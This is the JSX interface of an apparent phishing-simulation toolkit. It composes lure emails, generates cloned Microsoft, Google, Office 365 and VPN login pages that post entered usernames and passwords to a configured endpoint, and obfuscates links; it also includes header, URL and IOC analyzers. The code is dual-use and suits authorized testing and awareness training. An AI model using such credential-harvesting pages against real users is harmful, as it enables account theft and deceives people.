    <div style={{ maxWidth: 1280, margin: "0 auto" }}>
      <div
        style={{
          background: "rgba(251,113,133,0.1)",
          border: `1px solid rgba(251,113,133,0.25)`,
          borderRadius: 10,
          padding: "12px 16px",
          marginBottom: 20,
          fontFamily: mono,
          fontSize: 12,
          color: ACCENT,
          display: "flex",
          alignItems: "flex-start",
          gap: 10,
        }}
      >
        <AlertTriangle size={18} style={{ flexShrink: 0, marginTop: 2 }} />
        <span>⚠️ For authorized penetration testing and security awareness training only.</span>
      </div>

      <div style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 22 }}>
        <div
          style={{
            width: 36,
            height: 36,
            borderRadius: 8,
            background: "rgba(251,113,133,0.15)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <Mail size={20} color={ACCENT} />
        </div>
        <h1 style={{ fontFamily: heading, fontSize: 24, fontWeight: 700, color: TEXT, margin: 0 }}>Phishing Toolkit</h1>
      </div>

      <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 22 }}>
        {tabBtn(0, "Email templates", Mail)}
        {tabBtn(1, "Landing pages", FileText)}
        {tabBtn(2, "Link obfuscation", Link2)}
        {tabBtn(3, "Analysis", ShieldAlert)}
      </div>

      {tab === 0 && (
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: 20, alignItems: "start" }}>
          <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
            <div style={labelStyle}>Template</div>
            <select
              value={templateId}
              onChange={(e) => onPickTemplate(e.target.value)}
              style={{
                width: "100%",
                fontFamily: mono,
                fontSize: 12,
                padding: "10px 12px",
                borderRadius: 8,
                border: `1px solid ${BORDER}`,
                background: BG,
                color: TEXT,
                marginBottom: 16,
              }}
            >
              {EMAIL_TEMPLATES.map((t) => (
                <option key={t.id} value={t.id}>
                  {t.label}
                </option>
              ))}
            </select>
            <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              <Input label="Subject" value={subject} onChange={(e) => setSubject(e.target.value)} />
              <Input label="From name" value={fromName} onChange={(e) => setFromName(e.target.value)} />
              <Input label="From email" value={fromEmail} onChange={(e) => setFromEmail(e.target.value)} />
              <Input label="Target name" value={targetName} onChange={(e) => setTargetName(e.target.value)} />
              <Input label="Target email" value={targetEmail} onChange={(e) => setTargetEmail(e.target.value)} />
              <Input label="Custom link URL" value={customLink} onChange={(e) => setCustomLink(e.target.value)} />
              <div>
                <div style={labelStyle}>Urgency level</div>
                <select
                  value={urgency}
                  onChange={(e) => setUrgency(e.target.value)}
                  style={{
                    width: "100%",
                    fontFamily: mono,
                    fontSize: 12,
                    padding: "10px 12px",
                    borderRadius: 8,
                    border: `1px solid ${BORDER}`,
                    background: BG,
                    color: TEXT,
                  }}
                >
                  <option>Low</option>
                  <option>Medium</option>
                  <option>High</option>
                </select>
              </div>
            </div>
            <div style={{ display: "flex", gap: 10, marginTop: 18, alignItems: "center" }}>
              <span style={{ fontFamily: mono, fontSize: 11, color: DIM }}>Copy HTML</span>
              <CopyButton text={builtHtml} />
              <span style={{ fontFamily: mono, fontSize: 11, color: DIM, marginLeft: 8 }}>Plain text</span>
              <CopyButton text={plainText} />
            </div>
          </Card>

          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            <Card style={{ background: PANEL, border: `1px solid ${BORDER}`, minHeight: 320 }}>
              <div style={{ ...labelStyle, marginBottom: 10 }}>Live preview</div>
              <div
                style={{
                  background: "#fff",
                  borderRadius: 8,
                  overflow: "auto",
                  maxHeight: 420,
                  border: "1px solid rgba(0,0,0,0.08)",
                }}
              >
                <iframe title="email-preview" srcDoc={builtHtml} style={{ width: "100%", height: 400, border: "none" }} sandbox="" />
              </div>
            </Card>
            <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
                <Info size={16} color={ACCENT} />
                <span style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: TEXT }}>Red flags (educational)</span>
              </div>
              <ul style={{ margin: 0, paddingLeft: 18, fontFamily: mono, fontSize: 11, color: DIM, lineHeight: 1.6 }}>
                {redFlags.length === 0 && <li>No automated flags — still verify sender and links manually.</li>}
                {redFlags.map((f, idx) => (
                  <li key={idx} style={{ marginBottom: 10 }}>
                    <span
                      title={f.detail}
                      style={{
                        color: f.severity === "high" ? ACCENT : "#FBBF24",
                        cursor: "help",
                        borderBottom: "1px dotted rgba(251,113,133,0.4)",
                      }}
                    >
                      [{f.severity}] {f.title}
                    </span>
                    <div style={{ color: "rgba(226,232,240,0.45)", marginTop: 4 }}>{f.detail}</div>
                  </li>
                ))}
              </ul>
            </Card>
          </div>
        </div>
      )}

      {tab === 1 && (
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: 20 }}>
          <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
            <div style={labelStyle}>Template style</div>
            <select
              value={landTemplate}
              onChange={(e) => setLandTemplate(e.target.value)}
              style={{
                width: "100%",
                fontFamily: mono,
                fontSize: 12,
                padding: "10px 12px",
                borderRadius: 8,
                border: `1px solid ${BORDER}`,
                background: BG,
                color: TEXT,
                marginBottom: 14,
              }}
            >
              <option value="microsoft">Microsoft login</option>
              <option value="google">Google login</option>
              <option value="o365">Office 365</option>
              <option value="vpn">VPN portal</option>
              <option value="wifi">Corporate WiFi portal</option>
              <option value="custom">Custom</option>
            </select>
            <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              <Input label="Company name" value={companyName} onChange={(e) => setCompanyName(e.target.value)} />
              <Input label="Logo URL (optional)" value={logoUrl} onChange={(e) => setLogoUrl(e.target.value)} placeholder="https://..." />
              <Input label="Background color" value={bgColor} onChange={(e) => setBgColor(e.target.value)} />
              <Input label="Button text" value={buttonText} onChange={(e) => setButtonText(e.target.value)} />
              <Input label="Form POST endpoint" value={postEndpoint} onChange={(e) => setPostEndpoint(e.target.value)} />
              <Input label="Redirect URL (after submit)" value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} />
            </div>
            <button
              type="button"
              onClick={downloadLanding}
              style={{
                marginTop: 18,
                fontFamily: mono,
                fontSize: 12,
                fontWeight: 600,
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "10px 18px",
                borderRadius: 8,
                border: "none",
                background: ACCENT,
                color: "#1a0a0d",
                cursor: "pointer",
              }}
            >
              <Download size={16} />
              Download HTML
            </button>
            <div style={{ marginTop: 14, fontFamily: mono, fontSize: 10, color: DIM, lineHeight: 1.5 }}>
              Generated markup POSTs username/password to your configured endpoint. Include a visible disclaimer in real engagements.
            </div>
          </Card>
          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            <div
              style={{
                background: "rgba(180,83,9,0.2)",
                border: "1px solid rgba(251,191,36,0.35)",
                borderRadius: 8,
                padding: "10px 14px",
                fontFamily: mono,
                fontSize: 11,
                color: "#FBBF24",
              }}
            >
              For authorized penetration testing only — use only with written scope and consent.
            </div>
            <Card style={{ background: PANEL, border: `1px solid ${BORDER}`, flex: 1, minHeight: 400 }}>
              <div style={{ ...labelStyle, marginBottom: 10 }}>Sandboxed preview</div>
              <iframe
                title="landing-preview"
                srcDoc={landingHtml}
                sandbox="allow-forms allow-scripts"
                style={{ width: "100%", height: 480, border: "1px solid rgba(255,255,255,0.08)", borderRadius: 8, background: "#000" }}
              />
            </Card>
            <Card style={{ background: BG, border: `1px solid ${BORDER}` }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ ...labelStyle, marginBottom: 0 }}>Generated source</span>
                <CopyButton text={landingHtml} />
              </div>
              <pre
                style={{
                  margin: "12px 0 0",
                  fontFamily: mono,
                  fontSize: 10,
                  color: DIM,
                  maxHeight: 160,
                  overflow: "auto",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                }}
              >
                {landingHtml.slice(0, 2800)}
                {landingHtml.length > 2800 ? "\n…" : ""}
              </pre>
            </Card>
          </div>
        </div>
      )}

      {tab === 2 && (
        <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
          <Input label="Target URL to obfuscate" value={obfUrl} onChange={(e) => setObfUrl(e.target.value)} />
          {obfuscationBlocks.error ? (
            <p style={{ fontFamily: mono, fontSize: 12, color: ACCENT }}>{obfuscationBlocks.error}</p>
          ) : (
            <div style={{ display: "flex", flexDirection: "column", gap: 16, marginTop: 18 }}>
              {obfuscationBlocks.blocks.map((b, i) => (
                <div
                  key={i}
                  style={{
                    background: BG,
                    border: `1px solid ${BORDER}`,
                    borderRadius: 8,
                    padding: "12px 14px",
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
                    <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: TEXT }}>{b.title}</span>
                    <CopyButton text={b.content} />
                  </div>
                  <pre
                    style={{
                      margin: 0,
                      fontFamily: mono,
                      fontSize: 10,
                      color: DIM,
                      whiteSpace: "pre-wrap",
                      wordBreak: "break-all",
                      lineHeight: 1.5,
                    }}
                  >
                    {b.content}
                  </pre>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}

      {tab === 3 && (
        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
            <div style={labelStyle}>Paste email headers, raw message snippet, or URL</div>
            <textarea
              value={analysisInput}
              onChange={(e) => setAnalysisInput(e.target.value)}
              placeholder="Received: from ...&#10;From: ...&#10;Return-Path: ...&#10;Authentication-Results: ...&#10;&#10;Or: https://suspicious-link.example/path"
              rows={10}
              style={{
                width: "100%",
                boxSizing: "border-box",
                fontFamily: mono,
                fontSize: 11,
                padding: 12,
                borderRadius: 8,
                border: `1px solid ${BORDER}`,
                background: BG,
                color: TEXT,
                resize: "vertical",
                minHeight: 160,
              }}
            />
          </Card>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: 16 }}>
            <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
              <div style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: TEXT, marginBottom: 12 }}>Email header analyzer</div>
              {!headerAnalysis && (
                <p style={{ fontFamily: mono, fontSize: 11, color: DIM, margin: 0 }}>Paste RFC822-style headers to parse Received chain, auth, and spoof hints.</p>
              )}
              {headerAnalysis && (
                <div style={{ fontFamily: mono, fontSize: 11, color: DIM, lineHeight: 1.6 }}>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: ACCENT }}>Sender / From</span>
                    <div>{headerAnalysis.spoof.fromAddr || "(not parsed)"}</div>
                  </div>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: ACCENT }}>Return-Path</span>
                    <div>{headerAnalysis.spoof.returnPath || headerAnalysis.headers["return-path"] || "(none)"}</div>
                  </div>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: ACCENT }}>Reply-To</span>
                    <div>{headerAnalysis.spoof.replyTo || "(none)"}</div>
                  </div>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: sevColor(headerAnalysis.spoof.spoofRisk === "high" ? "high" : "medium") }}>Spoof risk: {headerAnalysis.spoof.spoofRisk}</span>
                    <div style={{ marginTop: 4 }}>{headerAnalysis.spoof.note}</div>
                  </div>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: ACCENT }}>SPF / DKIM / DMARC (from Authentication-Results)</span>
                    <div>SPF: {headerAnalysis.auth.spf || "—"}</div>
                    <div>DKIM: {headerAnalysis.auth.dkim || "—"}</div>
                    <div>DMARC: {headerAnalysis.auth.dmarc || "—"}</div>
                  </div>
                  <div style={{ marginBottom: 10 }}>
                    <span style={{ color: ACCENT }}>IPs in Received / X-headers</span>
                    <div>{headerAnalysis.ips.length ? headerAnalysis.ips.join(", ") : "(none extracted)"}</div>
                  </div>
                  <div>
                    <span style={{ color: ACCENT }}>Received chain (truncated)</span>
                    <pre style={{ margin: "8px 0 0", fontSize: 10, whiteSpace: "pre-wrap", wordBreak: "break-all", maxHeight: 120, overflow: "auto" }}>
                      {headerAnalysis.receivedChain.join("\n") || "(no Received: lines)"}
                    </pre>
                  </div>
                </div>
              )}
            </Card>

            <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
              <div style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: TEXT, marginBottom: 12 }}>URL analyzer</div>
              {!urlAnalysis && (
                <p style={{ fontFamily: mono, fontSize: 11, color: DIM, margin: 0 }}>Include an http(s) URL in the paste to score phishing indicators.</p>
              )}
              {urlAnalysis && urlAnalysis.error && (
                <p style={{ fontFamily: mono, fontSize: 11, color: ACCENT, margin: 0 }}>{urlAnalysis.error}</p>
              )}
              {urlAnalysis && !urlAnalysis.error && (
                <div style={{ fontFamily: mono, fontSize: 11, color: DIM }}>
                  <div style={{ marginBottom: 12, fontSize: 22, fontWeight: 700, color: sevColor(urlAnalysis.score >= 50 ? "high" : "low") }}>
                    Phishing score: {urlAnalysis.score} / 100
                  </div>
                  {Object.entries(urlAnalysis.parts).map(([k, v]) => (
                    <div key={k} style={{ marginBottom: 6 }}>
                      <span style={{ color: ACCENT }}>{k}</span>: {String(v)}
                    </div>
                  ))}
                  <div style={{ marginTop: 12 }}>
                    {urlAnalysis.indicators.map((ind, idx) => (
                      <div key={idx} style={{ color: sevColor(ind.sev), marginBottom: 6 }}>
                        • {ind.text}
                      </div>
                    ))}
                    {urlAnalysis.indicators.length === 0 && <div style={{ color: "#6ee7b7" }}>• No high-signal heuristics triggered (not a guarantee of safety).</div>}
                  </div>
                </div>
              )}
            </Card>

            <Card style={{ background: PANEL, border: `1px solid ${BORDER}` }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
                <div style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: TEXT }}>IOC extractor</div>
                <CopyButton
                  text={JSON.stringify(
                    {
                      ips: iocs.ips,
                      emails: iocs.emails,
                      urls: iocs.urls,
                      domains: iocs.domains,
                      hashes: iocs.hashes,
                    },
                    null,
                    2
                  )}
                />
              </div>
              <div style={{ fontFamily: mono, fontSize: 10, color: DIM, lineHeight: 1.6 }}>
                <div style={{ marginBottom: 8 }}>
                  <span style={{ color: ACCENT }}>IPs ({iocs.ips.length})</span>
                  <div>{iocs.ips.join(", ") || "—"}</div>
                </div>
                <div style={{ marginBottom: 8 }}>
                  <span style={{ color: ACCENT }}>URLs ({iocs.urls.length})</span>
                  <div style={{ wordBreak: "break-all" }}>{iocs.urls.join("\n") || "—"}</div>
                </div>
                <div style={{ marginBottom: 8 }}>
                  <span style={{ color: ACCENT }}>Emails ({iocs.emails.length})</span>
                  <div>{iocs.emails.join(", ") || "—"}</div>
                </div>
                <div style={{ marginBottom: 8 }}>
                  <span style={{ color: ACCENT }}>Domains ({iocs.domains.length})</span>
                  <div style={{ wordBreak: "break-all" }}>{iocs.domains.slice(0, 40).join(", ") || "—"}</div>
                </div>
                <div>
                  <span style={{ color: ACCENT }}>Hashes</span>
                  <div>MD5: {iocs.hashes.md5.length}</div>
                  <div>SHA1: {iocs.hashes.sha1.length}</div>
                  <div>SHA256: {iocs.hashes.sha256.length}</div>
                </div>
              </div>
            </Card>
          </div>
        </div>
      )}

    </div>
  );
}
